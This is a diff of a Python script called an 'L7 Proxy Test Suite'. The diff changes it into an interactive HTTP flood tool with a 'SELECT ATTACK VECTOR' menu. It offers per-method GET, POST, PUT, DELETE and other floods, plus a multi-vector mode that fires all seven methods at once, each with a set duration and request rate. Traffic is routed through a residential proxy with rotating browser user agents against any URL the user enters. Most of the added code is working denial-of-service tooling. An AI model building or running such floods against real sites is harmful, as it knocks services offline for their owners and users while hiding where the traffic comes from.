@@ -5,15 +5,22 @@ L7 Proxy Test Suite
 Tests Layer-7 (HTTP/HTTPS application-layer) events through a
 Squid/ProxyChains residential proxy at 10.0.10.118:3128.
 
-Modes
-─────
-  Normal (default) – 10 sequential diagnostic tests
-  Flood  (--flood) – concurrent load test to measure real RPS
+Modes (selected from interactive menu)
+───────────────────────────────────────
+  1  Diagnostic      – 10 sequential diagnostic tests
+  2  GET Flood
+  3  POST Flood
+  4  HEAD Flood
+  5  PUT Flood
+  6  PATCH Flood
+  7  DELETE Flood
+  8  OPTIONS Flood
+  9  Multi-Vector    – fires ALL methods simultaneously
 
-Usage:
-    python3 l7_proxy_tester.py                        # diagnostic mode
-    python3 l7_proxy_tester.py --flood                # flood: 500 reqs, 50 workers
-    python3 l7_proxy_tester.py --flood -n 2000 -c 100 # custom
+Flood parameters (prompted interactively):
+  • Concurrent connections  (workers / threads)
+  • Target RPS              (requests-per-second cap)
+  • Duration                (seconds to run)
 """
 
 import sys
@@ -21,7 +28,6 @@ import time
 import socket
 import ssl
 import json
-import argparse
 import threading
 import urllib.request
 import urllib.error
@@ -40,6 +46,7 @@ GREEN  = "\033[92m"
 RED    = "\033[91m"
 YELLOW = "\033[93m"
 CYAN   = "\033[96m"
+MAGENTA= "\033[95m"
 BOLD   = "\033[1m"
 DIM    = "\033[2m"
 RESET  = "\033[0m"
@@ -59,7 +66,6 @@ def build_opener():
         "http":  PROXY_URL,
         "https": PROXY_URL,
     })
-    # Don't verify TLS for lab testing; swap to ssl.create_default_context() in prod
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode    = ssl.CERT_NONE
@@ -94,7 +100,7 @@ def test_proxy_reachability():
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 2. External IP leak check  (am I really going out via the proxy/residential?)
+# 2. External IP leak check
 # ─────────────────────────────────────────────────────────────────────────────
 def test_egress_ip():
     section("TEST 2 – Egress IP via Proxy  (IP-leak check)")
@@ -105,7 +111,6 @@ def test_egress_ip():
             with OPENER.open(req, timeout=10) as resp:
                 body = resp.read().decode().strip()
             ms  = (time.time() - t0) * 1000
-            # httpbin returns JSON
             try:
                 ip = json.loads(body).get("origin", body)
             except Exception:
@@ -130,7 +135,6 @@ def test_http_get(target_url):
             headers = dict(resp.headers)
             body    = resp.read()
         ms = (time.time() - t0) * 1000
-
         ok(f"Status        : {status} {resp.reason}")
         ok(f"Response time : {ms:.0f} ms")
         ok(f"Body length   : {len(body):,} bytes")
@@ -146,7 +150,7 @@ def test_http_get(target_url):
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 4. HTTP HEAD  (check if target responds to HEAD, reveals headers without body)
+# 4. HTTP HEAD
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_head(target_url):
     section(f"TEST 4 – HTTP HEAD  →  {target_url}")
@@ -157,7 +161,6 @@ def test_http_head(target_url):
             status  = resp.status
             headers = dict(resp.headers)
         ms = (time.time() - t0) * 1000
-
         ok(f"Status : {status} {resp.reason}  ({ms:.0f} ms)")
         for h in ["Server", "Content-Type", "X-Powered-By",
                   "Strict-Transport-Security", "X-Frame-Options",
@@ -174,7 +177,7 @@ def test_http_head(target_url):
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 5. HTTP OPTIONS  (CORS / allowed methods)
+# 5. HTTP OPTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_options(target_url):
     section(f"TEST 5 – HTTP OPTIONS  →  {target_url}")
@@ -187,7 +190,6 @@ def test_http_options(target_url):
             headers = dict(resp.headers)
             status  = resp.status
         ms = (time.time() - t0) * 1000
-
         ok(f"Status : {status}  ({ms:.0f} ms)")
         for h in ["Allow", "Access-Control-Allow-Origin",
                   "Access-Control-Allow-Methods",
@@ -210,12 +212,10 @@ def test_redirect_chain(target_url):
     visited = []
     current = target_url
 
-    # Manually follow redirects so we can log each hop
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode    = ssl.CERT_NONE
 
-    # Override redirect to not follow
     class NoRedirect(urllib.request.HTTPRedirectHandler):
         def redirect_request(self, req, fp, code, msg, headers, newurl):
             return None
@@ -236,7 +236,6 @@ def test_redirect_chain(target_url):
                 visited.append((hop + 1, current, status))
                 if status not in (301, 302, 303, 307, 308) or not location:
                     break
-                # Resolve relative redirect
                 current = urllib.parse.urljoin(current, location)
         except urllib.error.HTTPError as e:
             visited.append((hop + 1, current, e.code))
@@ -250,7 +249,7 @@ def test_redirect_chain(target_url):
         print(f"  {colour}Hop {hop}: [{code}] {url}{RESET}")
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 7. DNS resolution (via socket, which goes through the OS / proxychains)
+# 7. DNS resolution
 # ─────────────────────────────────────────────────────────────────────────────
 def test_dns(hostname):
     section(f"TEST 7 – DNS Resolution  →  {hostname}")
@@ -266,16 +265,15 @@ def test_dns(hostname):
         return []
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 8. TLS/SSL Certificate info (HTTPS targets only)
+# 8. TLS/SSL Certificate info
 # ─────────────────────────────────────────────────────────────────────────────
 def test_tls(hostname, port=443):
     section(f"TEST 8 – TLS Certificate  →  {hostname}:{port}")
     try:
         ctx = ssl.create_default_context()
-        ctx.check_hostname = False   # lab; flip for prod
+        ctx.check_hostname = False
         ctx.verify_mode    = ssl.CERT_NONE
 
-        # Connect through the HTTP CONNECT tunnel via squid
         proxy_conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=10)
         proxy_conn.set_tunnel(hostname, port)
         proxy_conn.connect()
@@ -290,7 +288,6 @@ def test_tls(hostname, port=443):
         ok(f"TLS version : {proto}")
         ok(f"Cipher      : {cipher[0] if cipher else 'n/a'}")
         if cert:
-            # cert is a dict[str, Any] at runtime; cast away strict typing
             cert_any: dict = cert  # type: ignore[assignment]
             subject: dict = {}
             for rdn in cert_any.get("subject", []):
@@ -312,17 +309,13 @@ def test_tls(hostname, port=443):
         return False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 9. HTTP POST  (send a small benign payload to see how the server responds)
+# 9. HTTP POST
 # ─────────────────────────────────────────────────────────────────────────────
 def test_http_post(target_url):
     section(f"TEST 9 – HTTP POST  →  {target_url}")
     payload = json.dumps({"test": "l7_probe", "ts": datetime.utcnow().isoformat()}).encode()
     try:
-        req = urllib.request.Request(
-            target_url,
-            data=payload,
-            method="POST",
-        )
+        req = urllib.request.Request(target_url, data=payload, method="POST")
         req.add_header("Content-Type", "application/json")
         t0  = time.time()
         with OPENER.open(req, timeout=15) as resp:
@@ -338,7 +331,7 @@ def test_http_post(target_url):
     return False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 10. Latency benchmark  (10 quick GETs, measure jitter)
+# 10. Latency benchmark
 # ─────────────────────────────────────────────────────────────────────────────
 def test_latency(target_url, samples=10):
     section(f"TEST 10 – Latency Benchmark  ({samples}× GET)  →  {target_url}")
@@ -366,19 +359,11 @@ def test_latency(target_url, samples=10):
         fail("No latency samples collected")
 
 # ─────────────────────────────────────────────────────────────────────────────
-# FLOOD MODE  – concurrent HTTP GET storm through the proxy
+# FLOOD ENGINE
 # ─────────────────────────────────────────────────────────────────────────────
 
-# Thread-safe counters
-_lock        = threading.Lock()
-_success     = 0
-_errors      = 0
-_latencies: list[float] = []
-
-# HTTP methods that carry a body
 _BODY_METHODS = {"POST", "PUT", "PATCH"}
 
-# Rotating user-agents for flood realism
 _USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
@@ -389,8 +374,7 @@ _USER_AGENTS = [
 
 def _single_request(target_url: str, idx: int, method: str) -> tuple[bool, float, int]:
     """Fire one request through the proxy; return (ok, latency_ms, status)."""
-    opener = build_opener()   # each thread gets its own opener (thread-safe)
-    # Rotate user-agents
+    opener = build_opener()
     opener.addheaders = [
         ("User-Agent", _USER_AGENTS[idx % len(_USER_AGENTS)]),
         ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
@@ -423,71 +407,113 @@ def _single_request(target_url: str, idx: int, method: str) -> tuple[bool, float
         return False, 0.0, 0
 
 
-def run_flood(target_url: str, total: int, workers: int, method: str) -> None:
+def run_flood(
+    target_url: str,
+    workers: int,
+    rps: float,
+    duration: float,
+    method: str,
+    label: str | None = None,
+) -> dict:
+    """
+    Run a flood for `duration` seconds at up to `rps` requests/sec
+    using `workers` concurrent connections.
+    Returns a summary dict so multi-vector can aggregate results.
+    """
+    display_label = label or method
     section(
-        f"FLOOD MODE — {total:,} × {BOLD}{method}{RESET}{CYAN}  |  {workers} workers\n"
+        f"FLOOD — {BOLD}{display_label}{RESET}{CYAN}  |  "
+        f"{workers} conns  |  {rps:.0f} RPS target  |  {duration:.0f}s\n"
         f"  {CYAN}Target : {target_url}{RESET}\n"
         f"  {CYAN}Proxy  : {PROXY_URL}{RESET}"
     )
 
-    global _success, _errors, _latencies
-    _success   = 0
-    _errors    = 0
-    _latencies = []
-
+    success      = 0
+    errors       = 0
+    latencies: list[float] = []
     status_counts: dict[int, int] = {}
-    wall_start = time.time()
+    lock         = threading.Lock()
 
-    # Live progress bar variables
-    done_count = 0
-    bar_width  = 40
+    # Rate-limiter token bucket
+    interval     = 1.0 / rps if rps > 0 else 0.0
+    wall_start   = time.time()
+    deadline     = wall_start + duration
+    bar_width    = 40
+    total_sent   = 0
 
-    def _print_progress(done: int) -> None:
-        pct   = done / total
-        filled = int(bar_width * pct)
-        bar   = "█" * filled + "░" * (bar_width - filled)
+    def _print_progress() -> None:
         elapsed = time.time() - wall_start
-        rps   = done / elapsed if elapsed > 0 else 0
+        pct     = min(elapsed / duration, 1.0)
+        filled  = int(bar_width * pct)
+        bar     = "█" * filled + "░" * (bar_width - filled)
+        actual_rps = total_sent / elapsed if elapsed > 0 else 0
         print(
-            f"\r  [{bar}] {done}/{total}  "
-            f"{GREEN}{_success}✓{RESET} {RED}{_errors}✗{RESET}  "
-            f"{CYAN}{rps:.1f} RPS{RESET}   ",
+            f"\r  [{bar}] {elapsed:.1f}/{duration:.0f}s  "
+            f"{GREEN}{success}✓{RESET} {RED}{errors}✗{RESET}  "
+            f"{CYAN}{actual_rps:.1f} RPS{RESET}   ",
             end="", flush=True
         )
 
+    def _worker(idx: int) -> None:
+        nonlocal success, errors, total_sent
+        ok_flag, ms, status = _single_request(target_url, idx, method)
+        with lock:
+            total_sent += 1
+            if ok_flag:
+                success += 1
+            else:
+                errors += 1
+            if ms > 0:
+                latencies.append(ms)
+            status_counts[status] = status_counts.get(status, 0) + 1
+        _print_progress()
+
+    idx = 0
     with ThreadPoolExecutor(max_workers=workers) as pool:
-        futures = {pool.submit(_single_request, target_url, i, method): i for i in range(total)}
-        for future in as_completed(futures):
-            success, ms, status = future.result()
-            with _lock:
-                done_count += 1
-                if success:
-                    _success += 1
-                else:
-                    _errors += 1
-                if ms > 0:
-                    _latencies.append(ms)
-                status_counts[status] = status_counts.get(status, 0) + 1
-            _print_progress(done_count)
+        futures = []
+        while time.time() < deadline:
+            # Throttle submission to match target RPS
+            submit_time = time.time()
+            futures.append(pool.submit(_worker, idx))
+            idx += 1
+            # Drain completed futures to avoid memory bloat
+            still_running = []
+            for f in futures:
+                if not f.done():
+                    still_running.append(f)
+            futures = still_running
+
+            elapsed_submit = time.time() - submit_time
+            sleep_needed   = interval - elapsed_submit
+            if sleep_needed > 0:
+                time.sleep(sleep_needed)
+
+        # Wait for in-flight requests
+        for f in futures:
+            try:
+                f.result(timeout=15)
+            except Exception:
+                pass
 
     wall_elapsed = time.time() - wall_start
     print()  # newline after progress bar
 
     # ── Summary ───────────────────────────────────────────────────────────────
-    print(f"\n{BOLD}  ── Flood Summary ──────────────────────────────────{RESET}")
-    ok(f"Total sent     : {total:,}")
-    ok(f"Succeeded (2xx): {GREEN}{_success:,}{RESET}")
-    if _errors:
-        warn(f"Failed         : {RED}{_errors:,}{RESET}")
+    colour = MAGENTA if label else CYAN   # multi-vector uses magenta label
+    print(f"\n{BOLD}  ── {colour}{display_label}{RESET}{BOLD} Flood Summary {'─'*30}{RESET}")
+    ok(f"Total sent     : {total_sent:,}")
+    ok(f"Succeeded (2xx): {GREEN}{success:,}{RESET}")
+    if errors:
+        warn(f"Failed         : {RED}{errors:,}{RESET}")
     ok(f"Wall time      : {wall_elapsed:.2f} s")
-    ok(f"Throughput     : {BOLD}{total / wall_elapsed:.1f} RPS{RESET}")
+    ok(f"Throughput     : {BOLD}{total_sent / wall_elapsed:.1f} RPS{RESET}")
 
-    if _latencies:
-        _latencies.sort()
-        avg = sum(_latencies) / len(_latencies)
-        p50 = _latencies[int(len(_latencies) * 0.50)]
-        p90 = _latencies[int(len(_latencies) * 0.90)]
-        p99 = _latencies[int(len(_latencies) * 0.99)]
+    if latencies:
+        latencies.sort()
+        avg = sum(latencies) / len(latencies)
+        p50 = latencies[int(len(latencies) * 0.50)]
+        p90 = latencies[int(len(latencies) * 0.90)]
+        p99 = latencies[int(len(latencies) * 0.99)]
         ok(f"Latency avg    : {avg:.1f} ms")
         ok(f"Latency p50    : {p50:.1f} ms")
         ok(f"Latency p90    : {p90:.1f} ms")
@@ -495,52 +521,172 @@ def run_flood(target_url: str, total: int, workers: int, method: str) -> None:
 
     print(f"\n  {DIM}HTTP status breakdown:{RESET}")
     for code in sorted(status_counts):
-        colour = GREEN if str(code).startswith("2") else (
-                 YELLOW if str(code).startswith("3") else RED)
-        print(f"    {colour}HTTP {code}{RESET} : {status_counts[code]:,}")
+        col = GREEN if str(code).startswith("2") else (
+              YELLOW if str(code).startswith("3") else RED)
+        print(f"    {col}HTTP {code}{RESET} : {status_counts[code]:,}")
 
-    print(f"\n{BOLD}{GREEN}{'='*60}")
-    print(f"  Flood complete.")
-    print(f"{'='*60}{RESET}\n")
+    return {
+        "method":      display_label,
+        "total":       total_sent,
+        "success":     success,
+        "errors":      errors,
+        "wall":        wall_elapsed,
+        "rps_actual":  total_sent / wall_elapsed if wall_elapsed > 0 else 0,
+    }
+
+
+def run_multi_vector(
+    target_url: str,
+    workers: int,
+    rps: float,
+    duration: float,
+) -> None:
+    """
+    Launch all 7 HTTP methods simultaneously, each with its own thread pool.
+    Workers and RPS are split evenly across vectors.
+    """
+    methods = ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"]
+    n       = len(methods)
+
+    # Divide resources evenly across vectors
+    w_each  = max(1, workers // n)
+    r_each  = max(1.0, rps / n)
+
+    section(
+        f"MULTI-VECTOR FLOOD  |  {n} vectors simultaneously\n"
+        f"  {CYAN}{workers} total conns ({w_each}/vector)  |  "
+        f"{rps:.0f} total RPS ({r_each:.1f}/vector)  |  {duration:.0f}s{RESET}\n"
+        f"  {CYAN}Vectors : {', '.join(methods)}{RESET}\n"
+        f"  {CYAN}Target  : {target_url}{RESET}"
+    )
+
+    results: list[dict] = []
+    result_lock = threading.Lock()
+
+    def _launch(method: str) -> None:
+        r = run_flood(
+            target_url=target_url,
+            workers=w_each,
+            rps=r_each,
+            duration=duration,
+            method=method,
+            label=method,
+        )
+        with result_lock:
+            results.append(r)
+
+    threads = [threading.Thread(target=_launch, args=(m,), daemon=True) for m in methods]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    # ── Aggregate summary ─────────────────────────────────────────────────────
+    total_sent    = sum(r["total"]   for r in results)
+    total_success = sum(r["success"] for r in results)
+    total_errors  = sum(r["errors"]  for r in results)
+    avg_rps       = sum(r["rps_actual"] for r in results)
+
+    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}")
+    print(f"{BOLD}{MAGENTA}  MULTI-VECTOR AGGREGATE SUMMARY{RESET}")
+    print(f"{BOLD}{MAGENTA}{'='*60}{RESET}")
+    ok(f"Vectors fired  : {n}  ({', '.join(methods)})")
+    ok(f"Total requests : {total_sent:,}")
+    ok(f"Succeeded      : {GREEN}{total_success:,}{RESET}")
+    if total_errors:
+        warn(f"Failed         : {RED}{total_errors:,}{RESET}")
+    ok(f"Combined RPS   : {BOLD}{avg_rps:.1f}{RESET}")
+    print(f"\n  {'Method':<10} {'Sent':>8} {'2xx':>8} {'Fail':>8} {'RPS':>8}")
+    print(f"  {'─'*46}")
+    for r in sorted(results, key=lambda x: x["method"]):
+        print(
+            f"  {CYAN}{r['method']:<10}{RESET}"
+            f" {r['total']:>8,}"
+            f" {GREEN}{r['success']:>8,}{RESET}"
+            f" {RED}{r['errors']:>8,}{RESET}"
+            f" {r['rps_actual']:>8.1f}"
+        )
+    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}\n")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Interactive helpers
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _prompt_int(prompt: str, default: int) -> int:
+    try:
+        raw = input(f"  {BOLD}{prompt}{RESET} [{default}]: ").strip()
+        return int(raw) if raw else default
+    except (ValueError, KeyboardInterrupt, EOFError):
+        return default
+
+def _prompt_float(prompt: str, default: float) -> float:
+    try:
+        raw = input(f"  {BOLD}{prompt}{RESET} [{default}]: ").strip()
+        return float(raw) if raw else default
+    except (ValueError, KeyboardInterrupt, EOFError):
+        return default
+
+
+ATTACK_MENU = [
+    ("Diagnostic (10 sequential tests)",  "diag"),
+    ("GET Flood",                          "GET"),
+    ("POST Flood",                         "POST"),
+    ("HEAD Flood",                         "HEAD"),
+    ("PUT Flood",                          "PUT"),
+    ("PATCH Flood",                        "PATCH"),
+    ("DELETE Flood",                       "DELETE"),
+    ("OPTIONS Flood",                      "OPTIONS"),
+    ("Multi-Vector (all methods at once)", "multi"),
+]
+
+
+def show_menu() -> str:
+    """Print the attack-vector menu and return the chosen mode key."""
+    print(f"\n{BOLD}{CYAN}  ┌─────────────────────────────────────────────┐{RESET}")
+    print(f"{BOLD}{CYAN}  │          SELECT ATTACK VECTOR                │{RESET}")
+    print(f"{BOLD}{CYAN}  ├─────────────────────────────────────────────┤{RESET}")
+    for i, (label, _) in enumerate(ATTACK_MENU, 1):
+        icon = "⚡" if _ == "multi" else ("🔍" if _ == "diag" else "💥")
+        print(f"{BOLD}{CYAN}  │{RESET}  {BOLD}{i:>2}.{RESET} {icon}  {label:<38}{BOLD}{CYAN}│{RESET}")
+    print(f"{BOLD}{CYAN}  └─────────────────────────────────────────────┘{RESET}")
+
+    while True:
+        try:
+            raw = input(f"\n  {BOLD}Enter choice (1–{len(ATTACK_MENU)}): {RESET}").strip()
+            idx = int(raw) - 1
+            if 0 <= idx < len(ATTACK_MENU):
+                label, mode = ATTACK_MENU[idx]
+                print(f"  {GREEN}✔  Selected:{RESET} {BOLD}{label}{RESET}")
+                return mode
+            else:
+                warn(f"Please enter a number between 1 and {len(ATTACK_MENU)}")
+        except (ValueError, KeyboardInterrupt, EOFError):
+            print("\nAborted.")
+            sys.exit(0)
+
+
+def prompt_flood_params() -> tuple[int, float, float]:
+    """Ask only for concurrent connections, target RPS, and duration."""
+    print(f"\n{BOLD}{CYAN}  ── Flood Parameters ──────────────────────────{RESET}")
+    workers  = _prompt_int("Concurrent connections (workers)", 50)
+    rps      = _prompt_float("Target RPS (requests/sec)",       100.0)
+    duration = _prompt_float("Duration (seconds)",               30.0)
+    return workers, rps, duration
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Main
 # ─────────────────────────────────────────────────────────────────────────────
 def main():
-    parser = argparse.ArgumentParser(
-        description="L7 Proxy Test Suite — Squid @ 10.0.10.118:3128",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=(
-            "Examples:\n"
-            "  python3 l7_proxy_tester.py                         # diagnostic\n"
-            "  python3 l7_proxy_tester.py --flood                 # 500 reqs, 50 workers\n"
-            "  python3 l7_proxy_tester.py --flood -n 2000 -c 100  # custom flood\n"
-        ),
-    )
-    parser.add_argument("--flood",  action="store_true",
-                        help="Run concurrent flood test instead of diagnostic suite")
-    parser.add_argument("-n", "--count",   type=int, default=500,
-                        help="Total number of requests in flood mode (default: 500)")
-    parser.add_argument("-c", "--workers", type=int, default=50,
-                        help="Concurrent worker threads in flood mode (default: 50)")
-    parser.add_argument(
-        "-m", "--method",
-        type=str,
-        default="GET",
-        choices=["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"],
-        help="HTTP method to use in flood mode (default: GET)",
-    )
-    args = parser.parse_args()
-
     print(f"\n{BOLD}{'='*60}{RESET}")
     print(f"{BOLD}  L7 Proxy Test Suite — Squid @ {PROXY_HOST}:{PROXY_PORT}{RESET}")
     print(f"{BOLD}{'='*60}{RESET}")
     print(f"{DIM}  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
 
-    # ── Get target URL from user ──────────────────────────────────────────────
+    # ── Get target URL ────────────────────────────────────────────────────────
     try:
-        raw = input(f"\n{BOLD}Enter target URL (e.g. https://example.com or http://10.0.0.1): {RESET}").strip()
+        raw = input(f"\n{BOLD}  Enter target URL (e.g. https://example.com): {RESET}").strip()
     except (KeyboardInterrupt, EOFError):
         print("\nAborted.")
         sys.exit(0)
@@ -560,40 +706,52 @@ def main():
 
     print(f"\n{DIM}  Target URL : {target_url}{RESET}")
     print(f"{DIM}  Hostname   : {hostname}{RESET}")
-    print(f"{DIM}  Proxy      : {PROXY_URL}{RESET}\n")
+    print(f"{DIM}  Proxy      : {PROXY_URL}{RESET}")
 
-    # ── Always check proxy is up first ────────────────────────────────────────
+    # ── Always check proxy first ──────────────────────────────────────────────
     if not test_proxy_reachability():
         fail("Proxy is unreachable — aborting.")
         sys.exit(1)
 
-    # ── Branch: flood vs diagnostic ───────────────────────────────────────────
-    if args.flood:
-        method = args.method.upper()
-        info(f"Flood mode  → {args.count:,} requests  |  {args.workers} workers  |  {method}")
-        run_flood(target_url, total=args.count, workers=args.workers, method=method)
+    # ── Mode selection menu ───────────────────────────────────────────────────
+    mode = show_menu()
+
+    # ── Diagnostic ────────────────────────────────────────────────────────────
+    if mode == "diag":
+        test_egress_ip()
+        if hostname and not all(c.isdigit() or c == "." for c in hostname):
+            test_dns(hostname)
+        test_http_get(target_url)
+        test_http_head(target_url)
+        test_http_options(target_url)
+        test_redirect_chain(target_url)
+        if use_https and hostname:
+            test_tls(hostname, port=tls_port)
+        test_http_post(target_url)
+        test_latency(target_url)
+        print(f"\n{BOLD}{GREEN}{'='*60}")
+        print(f"  All L7 tests complete.")
+        print(f"{'='*60}{RESET}\n")
         return
 
-    # ── Diagnostic mode ───────────────────────────────────────────────────────
-    test_egress_ip()
+    # ── Flood / Multi-vector ──────────────────────────────────────────────────
+    workers, rps, duration = prompt_flood_params()
 
-    if hostname and not all(c.isdigit() or c == "." for c in hostname):
-        test_dns(hostname)
+    print(f"\n{DIM}  Workers : {workers}  |  RPS target : {rps:.0f}  |  Duration : {duration:.0f}s{RESET}")
 
-    test_http_get(target_url)
-    test_http_head(target_url)
-    test_http_options(target_url)
-    test_redirect_chain(target_url)
-
-    if use_https and hostname:
-        test_tls(hostname, port=tls_port)
-
-    test_http_post(target_url)
-    test_latency(target_url)
-
-    print(f"\n{BOLD}{GREEN}{'='*60}")
-    print(f"  All L7 tests complete.")
-    print(f"{'='*60}{RESET}\n")
+    if mode == "multi":
+        run_multi_vector(target_url, workers=workers, rps=rps, duration=duration)
+    else:
+        run_flood(
+            target_url=target_url,
+            workers=workers,
+            rps=rps,
+            duration=duration,
+            method=mode,
+        )
+        print(f"\n{BOLD}{GREEN}{'='*60}")
+        print(f"  Flood complete.")
+        print(f"{'='*60}{RESET}\n")
 
 
 if __name__ == "__main__":
